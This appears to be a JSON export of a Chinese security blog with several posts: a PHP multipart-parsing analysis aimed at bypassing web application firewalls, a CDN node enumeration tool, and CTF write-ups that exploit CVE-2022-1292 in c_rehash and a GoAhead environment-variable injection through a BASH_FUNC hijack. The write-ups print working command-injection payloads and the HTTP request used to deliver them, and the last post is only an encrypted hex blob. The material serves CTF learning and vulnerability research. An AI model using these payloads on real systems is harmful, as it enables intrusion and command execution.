{"meta":{"title":"白帽酱の博客","subtitle":"","description":"","author":"白帽酱","url":"https://rce.moe","root":"/"},"posts":[{"tags":[{"name":"PHP","slug":"PHP","permalink":"https://rce.moe/tags/PHP/"},{"name":"WAF","slug":"WAF","permalink":"https://rce.moe/tags/WAF/"},{"name":"bypass","slug":"bypass","permalink":"https://rce.moe/tags/bypass/"}],"title":"php在流量层面绕waf的一些姿势-php文件上传处理流程简单分析","date":"2022/06/24","text":"测试环境 PHP 7.1.9 php文件上传处理在 main/rfc1867.c 中的 rfc1867_post_handler函数 boundary值处理if (SG(post_max_size) &gt; 0 &amp;&amp; SG(request_info).content_length &gt; SG(post_max_size)) { sapi_module.sapi_error(E_WARNING, \"POST Content-Length of \" ZEND_LONG_FMT \" bytes exceeds the limit of \" ZEND_LONG_FMT \" bytes\", SG(request_info).content_length, SG(post_max_size)); return;}/* Get the boundary */boundary = strstr(content_type_dup, \"boundary\");//查找是否包含boundaryif (!boundary) { int content_type_len = (int)strlen(content_type_dup); char *content_type_lcase = estrndup(content_type_dup, content_type_len); php_strtolower(content_type_lcase, content_type_len); boundary = strstr(content_type_lcase, \"boundary\"); if (boundary) { boundary = content_type_dup + (boundary - content_type_lcase); } efree(content_type_lcase);}if (!boundary || !(boundary = strchr(boundary, '='))) {//判断boundary值起始位置 sapi_module.sapi_error(E_WARNING, \"Missing boundary in multipart/form-data POST data\"); return;//传入畸形的boundary会抛出警告 (可以用来检测目标php是否开启错误回显)}boundary++;boundary_len = (int)strlen(boundary);if (boundary[0] == '\"') {//引号包裹 boundary++; boundary_end = strchr(boundary, '\"'); if (!boundary_end) { sapi_module.sapi_error(E_WARNING, \"Invalid boundary in multipart/form-data POST data\"); return; }} else {//非引号包裹 /* search for the end of the boundary */ boundary_end = strpbrk(boundary, \",;\");//截止字符}if (boundary_end) { boundary_end[0] = '\\0'; boundary_len = boundary_end-boundary;}/* Initialize the buffer */if (!(mbuff = multipart_buffer_new(boundary, boundary_len))) { sapi_module.sapi_error(E_WARNING, \"Unable to initialize the input buffer\"); return; } 首先，php先从Content-Type是否包含boundary字符串之后寻找等号的位置作为起始位置，获取boundary值。boundary的值有引号包裹和无引号包裹两种情况在无引号包裹时，可以使用逗号或分号作为终止字符。到这里就可以总结出有效boundary格式了{任意字符}boundary{除等号外任意字符}=[“]{boundary内容}[“][[,;]{任意字符}] static multipart_buffer *multipart_buffer_new(char *boundary, int boundary_len){ multipart_buffer *self = (multipart_buffer *) ecalloc(1, sizeof(multipart_buffer)); int minsize = boundary_len + 6; if (minsize &lt; FILLUNIT) minsize = FILLUNIT; self-&gt;buffer = (char *) ecalloc(1, minsize + 1); self-&gt;bufsize = minsize; spprintf(&amp;self-&gt;boundary, 0, \"--%s\", boundary); self-&gt;boundary_next_len = (int)spprintf(&amp;self-&gt;boundary_next, 0, \"\\n--%s\", boundary); self-&gt;buf_begin = self-&gt;buffer; self-&gt;bytes_in_buffer = 0; if (php_rfc1867_encoding_translation()) { php_rfc1867_get_detect_order(&amp;self-&gt;detect_order, &amp;self-&gt;detect_order_size); } else { self-&gt;detect_order = NULL; self-&gt;detect_order_size = 0; } self-&gt;input_encoding = NULL; return self;} 在获取boundary值之后调用multipart_buffer_new来生成multipart的缓冲区函数内定义了body中的分界线–boundary值 结合上面几个特性构造一个比较极端的例子： body处理下面开始body的处理 if (!multipart_buffer_headers(mbuff, &amp;header)) { //获取multipart头 goto fileupload_done;}if ((cd = php_mime_get_hdr_value(header, \"Content-Disposition\"))) { char *pair = NULL; int end = 0; while (isspace(*cd)) { ++cd; } while (*cd &amp;&amp; (pair = getword(mbuff-&gt;input_encoding, &amp;cd, ';'))) { char *key = NULL, *word = pair; while (isspace(*cd)) { ++cd; } if (strchr(pair, '=')) { key = getword(mbuff-&gt;input_encoding, &amp;pair, '='); if (!strcasecmp(key, \"name\")) { if (param) { efree(param); } param = getword_conf(mbuff-&gt;input_encoding, pair); if (mbuff-&gt;input_encoding &amp;&amp; internal_encoding) { unsigned char *new_param; size_t new_param_len; if ((size_t)-1 != zend_multibyte_encoding_converter(&amp;new_param, &amp;new_param_len, (unsigned char *)param, strlen(param), internal_encoding, mbuff-&gt;input_encoding)) { efree(param); param = (char *)new_param; } } } else if (!strcasecmp(key, \"filename\")) { if (filename) { efree(filename); } filename = getword_conf(mbuff-&gt;input_encoding, pair); if (mbuff-&gt;input_encoding &amp;&amp; internal_encoding) { unsigned char *new_filename; size_t new_filename_len; if ((size_t)-1 != zend_multibyte_encoding_converter(&amp;new_filename, &amp;new_filename_len, (unsigned char *)filename, strlen(filename), internal_encoding, mbuff-&gt;input_encoding)) { efree(filename); filename = (char *)new_filename; } } } } if (key) { efree(key); } efree(word); } static int multipart_buffer_headers(multipart_buffer *self, zend_llist *header){ char *line; mime_header_entry entry = {0}; smart_string buf_value = {0}; char *key = NULL; /* didn't find boundary, abort */ if (!find_boundary(self, self-&gt;boundary)) {//匹配分界线 return 0; } /* get lines of text, or CRLF_CRLF */ while ((line = get_line(self)) &amp;&amp; line[0] != '\\0') {//获取下一行字符串 [1] /* add header to table */ char *value = NULL; if (php_rfc1867_encoding_translation()) { //[2] 判断编码 之后处理字符串会用到 好像默认禁用 写死了返回0?? self-&gt;input_encoding = zend_multibyte_encoding_detector((const unsigned char *) line, strlen(line), self-&gt;detect_order, self-&gt;detect_order_size); } /* space in the beginning means same header */ if (!isspace(line[0])) { value = strchr(line, ':'); } if (value) { if (buf_value.c &amp;&amp; key) { /* new entry, add the old one to the list */ smart_string_0(&amp;buf_value); entry.key = key; entry.value = buf_value.c; zend_llist_add_element(header, &amp;entry); buf_value.c = NULL; key = NULL; } *value = '\\0'; do { value++; } while (isspace(*value)); key = estrdup(line); smart_string_appends(&amp;buf_value, value); } else if (buf_value.c) { /* If no ':' on the line, add to previous line */ smart_string_appends(&amp;buf_value, line); //[2] 如果没有冒号就作为上一行的值 } else { continue; } } if (buf_value.c &amp;&amp; key) { /* add the last one to the list */ smart_string_0(&amp;buf_value); entry.key = key; entry.value = buf_value.c; zend_llist_add_element(header, &amp;entry); } return 1;} 这个过程有几个值得注意的点 [1] multipart中换行可以不是CLRF，只需要包含一个\\n就会判断为新行。 static char *get_line(multipart_buffer *self){ char* ptr = next_line(self); if (!ptr) { fill_buffer(self); ptr = next_line(self); } return ptr;} [2] 如果当前行没有冒号就和上一行合并这个就好玩了 直接一个字符一行 秒杀低端waf x)[3] multipart前后可以填充垃圾数据 filename的特殊处理为了兼容老旧的IE浏览器 需要对包含路径的文件名进行处理如果文件名包含/会取/后面字符串作为文件名 /* The \\ check should technically be needed for win32 systems only where* it is a valid path separator. However, IE in all it's wisdom always sends* the full path of the file on the user's filesystem, which means that unless* the user does basename() they get a bogus file name. Until IE's user base drops* to nill or problem is fixed this code must remain enabled for all systems. */s = _basename(internal_encoding, filename);if (!s) {s = filename;}PHPAPI zend_string *php_basename(const char *s, size_t len, char *suffix, size_t sufflen){ char *c; const char *comp, *cend; size_t inc_len, cnt; int state; zend_string *ret; comp = cend = c = (char*)s; cnt = len; state = 0; while (cnt &gt; 0) { inc_len = (*c == '\\0' ? 1 : php_mblen(c, cnt)); switch (inc_len) { case -2: case -1: inc_len = 1; php_mb_reset(); break; case 0: goto quit_loop; case 1:#if defined(PHP_WIN32) if (*c == '/' || *c == '\\\\') {#else if (*c == '/') {#endif if (state == 1) { state = 0; cend = c; }#if defined(PHP_WIN32) /* Catch relative paths in c:file.txt style. They're not to confuse with the NTFS streams. This part ensures also, that no drive letter traversing happens. */ } else if ((*c == ':' &amp;&amp; (c - comp == 1))) { if (state == 0) { comp = c; state = 1; } else { cend = c; state = 0; }#endif } else { if (state == 0) { comp = c; state = 1; } } break; default: if (state == 0) { comp = c; state = 1; } break; } c += inc_len; cnt -= inc_len; }quit_loop: if (state == 1) { cend = c; } if (suffix != NULL &amp;&amp; sufflen &lt; (size_t)(cend - comp) &amp;&amp; memcmp(cend - sufflen, suffix, sufflen) == 0) { cend -= sufflen; } len = cend - comp; ret = zend_string_init(comp, len, 0); return ret;}","permalink":"https://rce.moe/2022/06/24/php-upload-bypass-waf/","photos":[]},{"tags":[],"title":"cdnlookup 一个使用 ECS 遍历智能DNS节点IP地址的工具","date":"2022/06/05","text":"前言前不久我遇到了一个关于获取CDN节点ip列表的问题:如何快速获取一家CDN节点在全国的范围内的节点ip？ 为了解决这个问题，我分析了智能DNS的工作原理。根据原理，我写出了一个使用 Edns-Client-Subnet(ECS) 伪造客户端ip用于遍历cdn节点ip的小工具。 之前为了获取目标地理位置的的CDN节点需要使用大量代理服务器去发起DNS查询。但是寻找合适的代理服务器非常困难。这个工具解决了这个问题。 该工具无需使用代理，只需要提供要模拟的客户端ip地址，就可以轻松获取对应ip地址地理位置的DNS解析结果。 cdnlookup项目地址 https://github.com/burpheart/cdnlookup 原理智能DNSCDN 为了让用户连接到地理位置更近的服务器，在DNS解析时使用了一种叫做智能DNS解析的操作。 CDN的权威DNS服务器会根据客户端IP地址来判断用户所在区域及运营商，来返回距离较近的节点。 早期，权威DNS服务器通常无法直接获取到客户端ip，只能获取到上级公共递归DNS服务器地址。 Edns Client Subnet(ECS)ECS 是由Google提交的一份DNS扩展协议，主要作用是传递用户的IP地址给权威DNS服务器。 rfc7871 （2016 年 5 月） 遵循ECS标准的公共DNS，会将经遮罩脱敏后的客户端ip添加至DNS扩展区域( EDNS rfc6891)传递至权威DNS （IPV4 遮罩通常为/24 IPV6 为 /56） 这样权威DNS服务器就可以获取到模糊的客户端ip，这足以用于判断用户运营商和位置信息。 cdnlookup这个工具会直接发送包含自定义IP的ECS数据的DNS请求，诱导NS服务器返回对应IP的解析结果。 经测试，国内大部分公共DNS都不支持自定义ECS。 谷歌DNS 8.8.8.8 可以正常使用 除了公共递归DNS，也可以直接将带有ECS数据的DNS请求发送到目标权威DNS服务器，获取解析结果。 使用-d 域名 (默认 www.taobao.com)-i 只输出IP地址列表-ip 客户端ip-r 请求重复轮数-s DNS服务器地址 (默认 8.8.8.8:53)-6 AAAA 查询 (IPV6) 自定义客户端ip cdnlookup.exe -d www.taobao.com -ip 1.2.3.4219.147.75.XXX219.147.75.XXX 使用内置实例ip列表 (内置列表可能会出现判断错误. 建议使用家宽ip段地址定位. ) cdnlookup.exe -d www.taobao.com北京市 教育网36.99.228.XXX36.99.228.XXX吉林 长春 移动111.26.147.XXX111.26.147.XXX辽宁 沈阳 电信59.47.225.XXX59.47.225.XXX...... IPV6 查询 cdnlookup.exe -d www.jd.com -6 -ip 240e:382:701:7700:600c:5c8:0000:0000240e:c3:2800::26240e:c3:2800::22240e:95d:c02:200::3a","permalink":"https://rce.moe/2022/06/05/cdnlookup/","photos":[]},{"tags":[{"name":"CTF","slug":"CTF","permalink":"https://rce.moe/tags/CTF/"},{"name":"CVE","slug":"CVE","permalink":"https://rce.moe/tags/CVE/"}],"title":"第15届全国大学生信息安全竞赛 online_crt writeup    c_rehash(CVE-2022-1292)   ciscn 2022","date":"2022/05/30","text":"author:白帽酱题目给了后端源码 一道题利用了前不久出现的一个鸡肋洞 openssl c_rehash(CVE-2022-1292) 题目还是比较有意思的 项目分析项目后端是pyhton + gopyhton的服务直接暴露给用户pyhton服务 一共有4个路由/getcrt 生成一个x509证书/createlink 调用 c_rehash 创建证书链接/proxy 通过代理访问go服务 @app.route('/', methods=['GET', 'POST'])def index(): return render_template(\"index.html\")@app.route('/getcrt', methods=['GET', 'POST'])def upload(): Country = request.form.get(\"Country\", \"CN\") Province = request.form.get(\"Province\", \"a\") City = request.form.get(\"City\", \"a\") OrganizationalName = request.form.get(\"OrganizationalName\", \"a\") CommonName = request.form.get(\"CommonName\", \"a\") EmailAddress = request.form.get(\"EmailAddress\", \"a\") return get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress)@app.route('/createlink', methods=['GET'])def info(): json_data = {\"info\": os.popen(\"c_rehash static/crt/ &amp;&amp; ls static/crt/\").read()} return json.dumps(json_data)@app.route('/proxy', methods=['GET'])def proxy(): uri = request.form.get(\"uri\", \"/\") client = socket.socket() client.connect(('localhost', 8887)) msg = f'''GET {uri} HTTP/1.1 Host: test_api_host User-Agent: Guest Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ''' client.send(msg.encode()) data = client.recv(2048) client.close() return data.decode() go后端有一个admin路由用于重命名证书文件 func admin(c *gin.Context) { staticPath := \"/app/static/crt/\" oldname := c.DefaultQuery(\"oldname\", \"\") newname := c.DefaultQuery(\"newname\", \"\") if oldname == \"\" || newname == \"\" || strings.Contains(oldname, \"..\") || strings.Contains(newname, \"..\") { c.String(500, \"error\") return } if c.Request.URL.RawPath != \"\" &amp;&amp; c.Request.Host == \"admin\" { err := os.Rename(staticPath+oldname, staticPath+newname) if err != nil { return } c.String(200, newname) return } c.String(200, \"no\"+c.Request.URL.RawPath+\",\"+c.Request.Host )} 解题c_rehash题目中出现了 c_rehashc_rehash是openssl中的一个用perl编写的脚本工具用于批量创建证书等文件 hash命名的符号链接最近c_rehash 出了个命令注入漏洞 (CVE-2022-1292)经过搜索网上并没有公开的exp (可能因为这个漏洞非常鸡肋)只能通过diff进行分析https://github.com/openssl/openssl/commit/7c33270707b568c524a8ef125fe611a8872cb5e8这个就是漏洞的commit很容易看出 文件名这里过滤不严 没有过滤反引号就直接把文件名拼接到了命令里所以只要在文件名中使用反引号就可以执行任意命令继续上前追溯 sub hash_dir { my %hashlist; print \"Doing $_[0]\\n\"; chdir $_[0]; opendir(DIR, \".\"); my @flist = sort readdir(DIR); closedir DIR; if ( $removelinks ) { # Delete any existing symbolic links foreach (grep {/^[\\da-f]+\\.r{0,1}\\d+$/} @flist) { if (-l $_) { print \"unlink $_\" if $verbose; unlink $_ || warn \"Can't unlink $_, $!\\n\"; } } } FILE: foreach $fname (grep {/\\.(pem)|(crt)|(cer)|(crl)$/} @flist) { # Check to see if certificates and/or CRLs present. my ($cert, $crl) = check_file($fname); if (!$cert &amp;&amp; !$crl) { print STDERR \"WARNING: $fname does not contain a certificate or CRL: skipping\\n\"; next; } link_hash_cert($fname) if ($cert); link_hash_crl($fname) if ($crl); }} 发现在执行命令前会检查 文件后缀名.(pem)|(crt)|(cer)|(crl) 和文件内容文件内容必须包含证书或者是吊销列表才能通过检查到这里可以整理出这个鸡肋洞的条件了 利用条件 执行c_rehash 目标目录下文件可控 文件后缀符合要求 文件内容必须包含证书或者是吊销列表 文件名可控 题目中生成证书的功能可以创建一个满足要求的文件 go server接下来看go的部分为了实现可控的文件名 我们需要调用go的重命名功能go的路由在重命名前有两个校验c.Request.URL.RawPath != “” &amp;&amp; c.Request.Host == “admin”首先需要绕过这两个验证 url注入http头Request.Host就是请求的host头在python的请求包中host头是固定的 (test_api_host)这里要想办法让go后端认为host值是admin python 在代理请求时直接使用了socket 发送raw数据包在数据包{uri}处没有过滤所以我们可以直接在uri注入一个host头来替换原先的头注入之后数据包就变成了这样 GET / HTTP/1.1Host: adminUser-Agent: GuestAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeHTTP/1.1Host: test_api_hostUser-Agent: GuestAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close 这样就绕过了host头的校验 go的RawPath特性通过阅读go net库的源码我发现在go中会对原始url进行反转义操作(URL解码)如果反转义后再次转义的url与原始url不同 那么RawPath会被设置为原始url 反之置为空 注释中贴心的给出了示例和详细的功能介绍所以只要我们把url中的任意一个斜杠进行url编码 就可以绕过这个检查了 构造利用链接下来就是构造这个简单的利用链 第一步请求 /getcrt 路由 生成一个证书 返回证书路径 第二步请求 /proxy 修改证书名为恶意文件名 这里有一些坑点linux文件名虽然可以包大部分可打印字符但是有一个除外 那就是斜杠不能使用斜杠这限制了命令执行的内容下面是我在这次ctf尝试的解决方案在这一步我尝试了几个小时目标环境有些玄学的问题 使用base64 编码构造 echo Y2F0IC9mbGFnID4gZHNmZ2g= |base64 -d|bash尝试使用base64绕过本地测试利用成功在目标机器多次尝试均失败 (可能是目标docker环境问题 缺少base64工具) 使用截断环境变量linux有很多预制的系统环境变量比如PATH SHELLbash 可以通过${变量名:偏移:长度} 简单的截取环境变量值这里我们使用SHELL环境变量的开头第一个字符来替代斜杠${SHELL:0:1}这种方法本地测试成功都是在目标机器多次尝试还是失败 使用现有环境变量构造命令 env &gt;qweqwe获取到了目标机器的环境变量值运气非常好 OLDPWD的值刚好为我们所需要的 /最终使用了这个方法成功读取到了flag 第三步请求 /createlink 触发 c_rehash RCE ls $OLDPWD &gt;qweqwe成功列出了根目录的内容然后执行 cat ${OLDPWD}flag &gt;jnyghj读取flaguri=/admin/rename?oldname=d205092e-c641-423e-82f0-e96f583f3c38.crt&amp;newname=0cat ${OLDPWD}flag &gt;jnyghj.crt 总结因为之前分析过c_rehash这个鸡肋的洞 当时看了一眼标题就猜到了整个利用链没想到还是在构造payload上花了太多时间(由于利用特殊性 这个漏洞在实战应该不太可能遇见)","permalink":"https://rce.moe/2022/05/30/c-rehash-CVE-2022-1292-ciscn-2022-online-crt/","photos":[]},{"tags":[{"name":"writeup","slug":"writeup","permalink":"https://rce.moe/tags/writeup/"},{"name":"WEB","slug":"WEB","permalink":"https://rce.moe/tags/WEB/"},{"name":"goahead","slug":"goahead","permalink":"https://rce.moe/tags/goahead/"}],"title":"ping2rce出题人writeup 一种环境变量注入劫持bash的实际利用场景","date":"2022/05/25","text":"前言前不久p牛分享了一个利用环境变量注入劫持bash的技巧.当时我就在想这种环境变量的注入有没有什么比较通用的场景。一般遇到的环境变量注入基本上都是直接使用ld_preload解决问题。p牛的这种新的环境变量注入的利用技巧，有没有什么特殊的利用面呢。 GoAhead 嵌入式设备常用的Web服务器 GoAhead 出现过环境变量注入漏洞 CVE-2017-17562 和 CVE-2021-42342。漏洞的原理很简单：服务器会把收到的CGI请求参数直接写入到环境变量中。 CVE-2017-17562 的修复方案也很简单：在写入的环境变量前加 CGI_前缀 添加黑名单过滤（实际上无效）。但是这补丁并没有完全修复。在 multipart 表单请求遗漏了请求参数的处理 黑名单也没起作用 所以就有了CVE-2021-42342当时我在复现 CVE-2017-17562和CVE-2021-42342 时遇到了一个问题.我在上传文件时发生了500错误 控制台无任何错误输出 阅读源码后我发现GoAhead 上传文件时会向一个固定的临时文件夹写入临时文件 默认为–home参数提供的目录下的tmp目录如果目录不存在 或者是无法写入文件，就无法完成上传流程。（在后来搜索漏洞分析的才发现了p牛的文章已经写过了我遇到的坑 还有一些其他的玄学问题）在创建tmp目录后，我成功的完成了漏洞复现。这时我想到了一个问题： 嵌入式设备大多都是只读文件系统，即使是可写也没有创建这个临时目录。那么，这个漏洞在实际的场景下应该很难利用。当时没有其他方法只能止步于此。 直到我遇到了p牛的这篇文章。 GoAhead + bash一些嵌入式设备会有执行系统命令的场景。比如ping 路由跟踪 等等。在这个场景下并结合p牛的bash劫持，就可以完美的完成命令执行目标。随便构建一个cgi int isValidIp4 (char *str) { int segs = 0; /* Segment count. */ int chcnt = 0; /* Character count within segment. */ int accum = 0; /* Accumulator for segment. */ /* Catch NULL pointer. */ if (str == NULL) return 0; /* Process every character in string. */ while (*str != '\\0') { /* Segment changeover. */ if (*str == '.') { /* Must have some digits in segment. */ if (chcnt == 0) return 0; /* Limit number of segments. */ if (++segs == 4) return 0; /* Reset segment values and restart loop. */ chcnt = accum = 0; str++; continue; } /* Check numeric. */ if ((*str &lt; '0') || (*str &gt; '9')) return 0; /* Accumulate and check segment. */ if ((accum = accum * 10 + *str - '0') &gt; 255) return 0; /* Advance other segment specific stuff and continue loop. */ chcnt++; str++; } /* Check enough segments and enough characters in last segment. */ if (segs != 3) return 0; if (chcnt == 0) return 0; /* Address okay. */ return 1;}printf(\"&lt;HTML&gt;&lt;TITLE&gt;Network looking glass&lt;/TITLE&gt;&lt;BODY&gt;\\r\\n\");printf(\"&lt;form action=\\\"\\\" method=\\\"GET\\\"&gt;\\r\\n\");printf(\"&lt;input name=\\\"ip\\\"&gt;\\r\\n\");printf(\"&lt;input type=\\\"submit\\\" value=\\\"ping\\\"&gt;\\r\\n\");printf(\"&lt;/form&gt;\\r\\n\");fflush(stdout);if (numQueryKeys != 0) { printf(\"&lt;H2&gt;result&lt;/H2&gt;\\r\\n\"); for (i = 0; i &lt; (numQueryKeys * 2); i += 2) { if (queryKeys[i+1] != 0) { if(isValidIp4(queryKeys[i+1])){ char buffer[256]; printf(\"&lt;p&gt;$ping -c 4 -w15 %s&lt;/p&gt;\\r\\n&lt;textarea style=\\\"width: 484px; height: 165px;\\\"&gt;\",queryKeys[i+1]); fflush(stdout); sprintf(buffer, \"ping -c 4 -w15 %s\", queryKeys[i+1]); system(buffer); fflush(stdout); printf(\"&lt;/textarea&gt;\"); }else{ printf(\"&lt;H2&gt;invalid ip&lt;/H2&gt;\\r\\n\"); } } }}printf(\"&lt;/BODY&gt;&lt;/HTML&gt;\\r\\n\"); 使用p牛的 bash环境变量注入劫持ping 命令实现任意代码执行POST /cgi-bin/ping?fdhtf=1.1.1.1 HTTP/1.1Host: 1.1.1.1Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=—————————123456Connection: close —————————–123456Content-Disposition: form-data; name=”BASH_FUNC_ping%%” () { cat /flag; }—————————–123456– 题目部署文件https://github.com/burpheart/ping2rce 参考https://tttang.com/archive/1450/https://www.potato.gold/article/79.htmlhttps://www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html","permalink":"https://rce.moe/2022/05/25/ping2rce-writeup-goahead-environment-variable-inject-bash-hijack/","photos":[]},{"tags":[{"name":"password","slug":"password","permalink":"https://rce.moe/tags/password/"}],"title":"CTFd性能优化笔记-DNUICTF","date":"2022/05/08","text":"971767c7fa9cac7730e91fe7c0dcc1197c7da1a27ce0bccf0cba4b1cebf783ea1862478d1dbf6f1e763285a5ef9b1d58fa03049f9fb7c6335e7e910dc7b06775bfdf1fc4339f5ff7a32a50d053c42a69d92a61fbd8cefb37ad41c74465f01dd66d3d1f5bc4e3fe1a856795ded6b1c212d1468cd64901397a100996444ba9958e1ad6d31f0bb26dad19abf1d3714304211b746acc425f4819c2880cfef3427f8fe10bd41125825abb12911284ed8acc47aa87034f8ff86cde3bc63917a74bfcec0f01e26330e948e5cd54a1945eb36d8ab9ba34332a357c26e0f2d874ea73b96a9169ee85f7d5985642cd241e6416ccb213ca5c89cafbd4b23a6c2dbb768b71ba9303ea0db4982320f6d92680844d586e7e579918cc161e68b81586f4dad0e1c874400cb45a03681bbef4a451a0bc195266af21fa7dd8bfe81e67cee0676292b560482c3ec8cef85352197bfcba82bbc44f1f2284169d7f129efbf93d6146af1776ad6ce328a6590cfa6de1e533beba51d2a64ff9df99ec3c8e3637322b08583e46a342c2a7d8aca24fba8db00e6cf9e16903e6cebe735a6b9a08a0623097fadb4240b18434360d261e2744ebbf5b0cf409e52bb31db0be820903dedb3799918588ce26cf0db4e0b9d3b437d2749e7ca6e7deb3986f3b21aeac7c45567fca4b6b4b90fbfed9f7ceaeed01164e6dd112d6d87e35976b9433992aee9d078939048616d2901968fa2f0fd1f69f842f5c56c1f22af54ad3d61d9b0bde475c1c53eef80a6dc668800d981ca5bb9d8ee1b4dca92e19b1b7bf0f796917b9b2353c11a3a5e30018a4679bf2e57ad6495572d9466db67d39d812bb2d4c4a3317a53b6eb717415501d31b086917e61bd5df9afa340b07d22d839d56d4f7256d52d4a6222fe60c536b50931193dfb5687a00bfc61ce8114d655296bc7bd5595cdf19ee39c311682c765abdb69b0d204c8a3b258bd886d9cc08d870985f1676bf22425783af14849f35e21068cdee9ae1d2ad9c95f90758496784b4779d2acb95f4a29294ee0a2cbb53c761427db847e4785502ec4e4db0441fb4f8f90391eb753720cba3602bdde2f3b1601af29829d40a6020740d8becd3daf9bfb2b9096d89b4b24917f0b09c8ad09ee29465727ca846b65537baf050b74e281ababa55b1f904634cd090e2ef048c0c8f1013ba243c1c2aeead18c6df37ff97b2e428e939e2e2e5cdfe0a1bffb11f73276af5708dc10db32b67138dac517c6372387d6bfa9ce26055a7c5b32ac54c195fb939a4d07494ae0f70187e8a94e74e846a777dda7458fed46f5b024be2a4ec0fd04b2cb2b364badf54036d05b75c3fd068c236918d9165ebc22ee66308f37afbca70c3d89f2727428b7337df54b5912c8ca6d8d49d75e591276a49a49c2c26076ebdf82c959be51d790b7b9fd9e4b3ce7045f16d650ee3c3ba54bb0eefee59d3ea9ea604bb04fcac819620d9d15234e36b2606e0c02bae9f32b3635a199d0629468beb5705d0f6ed5c8a51712dd853532c0eeb2c877f26be38d2c494306bc74a2851e113fd7b3696d2679fe044822c7dfc8877a873101373fbd8b0b75291807435bfe3880822216a11538041b089705dcab9376745aa8813eecec6d404241485a37105756265a4360c416a08a7e27e80e954bc7e802e6f045ab3b968785bb33049c166d65d96e7c3cfe14a9f5caf47e3649f0e1a5b1de7ad8137ebf12f65bf7ca956a8c23059eca73d6bb90a759f949a39ce6c91e47571a8bfda333e4343c49a73218b194132b26c03bbd7ce93e5b867da94cb65bf446f672cb5406f32ae50d897aadf50c26b302fa32ec851c6e5dbed6582eb1602c8111b1b89a6bf93fa61ed46f20452b429b73224b66eb8f36928bd4f28ae0bdb056edce461aa10941b8131ca1196f19c997c29d4e9aa7feeecb91c560063854b32c99180774f95952073ea16105059c1a1dae06f53f5b3072f4d78712cf929b009e0fc08922b5ae9e6115a26bcf4a947a3ae3e28ff451237feb0e0478125e0c167f807a9bd953a4273d8dc8cc4d3515bbd0eee1129ffb96ad87b07ceefea8ef119f76da4f49378a7320cf1b0a33f397f712cae764c7b58475b2038740bed8de4af1c316cf87f293fcb4b1d4a0cf23f3ad00f5337a27aa2c12330879dece1bae56c7187401662a0c7e734d945d8ac93b6c0fc3c57133159f5bd0e448a826347303f0e991b6b2056ed01b615673f283670d4a59cdd71c8595adebcedd8f3c58e196753416019c8b568b9f6e1c4f2f2cc6167e313031383f4cc4973eb78adbd2107057983b884ee775b4924a9028e845a8aeba98c5aa09defd6b3a34bfe05080c6b27e2748133d8605be2f6e05de6d82d0392274a13c87b78b764e4a23879580312753ff2cb894f8259686fecb24b6b2f68ec841d2c0d4d08721523e35f94e58e95fdf9b48673c4e023c6eec299d879dc89942092e050897a8130e41f3e52c6aaeda077c1a72367c256b5ef6da7342a02c1dcf8e6232e8f263f98c857d2dc293b939fe42b1cf43cd0980ab2eed7b9d2c59d4a711d6ab16a1026965254d4775ea86ecb70bcf6177ced5c0032a59e582e362443156eee68849d12b629797d0b681e05e8d16b80eebeeec4bff307514165ad8a3914c68412a25171f87b05a9b1f23e9ee55ea31eb819d638a106aa69016391fd9da4914f1032c0dac17171abefc4a161042ce29f582a412c23aebc16e0f16ba98f1a7f19bc3c3e15781b533daa118496f2c4a7061a99be55cc391d988aab3f13586e4ca288bafc936978dadb96689ca9de714c112b020811cd4a66b0b914bb6add5a6d26d8555cc441b442027317d6e55740c32a3796af1dd77ea39d5f4baccb1a8a506dadf7d8ff72424ba0520a3fde2e579075882c153572afd40c206b185cdd1a229a1658772d014028cd784fb3522bce7e697d928203e87a4a67e2735011fae60935e5e7ee55b53ae0e11b5f22b04427099a0ace2225ab76bba64e9e373bc4004a2156abda37c97b5b0524d3f47898c1953d3df7b5c7e1f6a2310957dfcd6dfcccccb044268510397619e43775836f9b49f314333e60f134b4a6871885624a968cc816527cd206343d5875cf5cee3efbd5b7b60b389d71b886b7b5ed80e14a58376495a2243096f9fc5130600d0b8f612c1e53297f58c8df4049ef39140263f4a3a3010759475bd1a5610a4a4a2e1b5986b600f8e47607c03264a85259ea4b577bb0002de85fc6ab83eac83776944a332330a389dba52d4a11cf87fa46a4ceada2ce2cb64aee554c3e017a7cef1841ad50fd1c47b0ded95cef4c69b4dca4432a396faa0d9087f6e02ebe34f1e074307076923530a0cf1122dd75d3dbed7ce734cd8b576d1ddf3533d01add503edbe1e1812e8570cd002da5ff46fba4c096c44bfdb0ac4869292a8f9c81784712efe1172349d56aa88359233731233adbbbbae469ae23b71ebbf0839d7c954ed22ecce26b3ebf0799db1a884afe35ad41d67b0dd9d7e0a5ecfe6bbdd686f1379f32df2d43c90a8743636b3ea650bfaa1b90c0a91ab9d867a6af9734e2e6520c73dcea570fb412587385ec30903b3eaa54ebce478e45fe0f7fb57d7f8358dfd6b57d50d72bd76c0823a029fdaccb300f1a38b28b8810f4a6ddd9bdb94cec9be450ab50b5313f0810e66a25b9f11fc051c362b54fffcabf0df3e2df75f0acc511563a3d2b7d971c8f22301c7dfca131bcd82e6d96232b3c277b71f48b7269c02fdab69c068ea8abef44a41274b191f6de8d2fa126a872db75a3426530075226e89cc8593baaa09fe9b6a01cd2a42578afe5012872ba0a43cb05d892e3de52079e98e2cd2546766bdfa09d7a13adeeda53c6386d0abeab644ff6ed04961795de1c36cc91bc60b2b39d18cf576879cb6e128c03b53310637dedce14126396df9c957522ea8aa37adc3f97c68d2ab05c38a79c15cf43c72e777f4b68b72c478518888b20b3eab7041a821ee1c95ce1da5e25fff9de1dd1dead684205d568a66d4a4c1b63c26046fe73e7b1dc1a1f861dda848093688e4fb65a0f971c73725d9c2bad089b45ec91ee1aa1a17c15fa250bbec7be2c148058ef2581bf60382261df9956863a52e7b7c0f51f22a40e80238d50be779e3dc0254f4aab76f7e81486d3a883d05be9667a3f6d1581e6b356ea78fc6aee34e57bd948949f4eb861177e2ba5bfc4563f95c2d907bf1f490f4e2b0056eb57e383c27c4af3349be11d3f23e77d8c8205e938ea571fd2df7300c7d3de8d4326b48201174115e7b99972da7a849d2c347b88f27f6815bf96a2f9784d520493842fe249db72c299d92bd9de4a0ec7270f866a6512fcdee0e967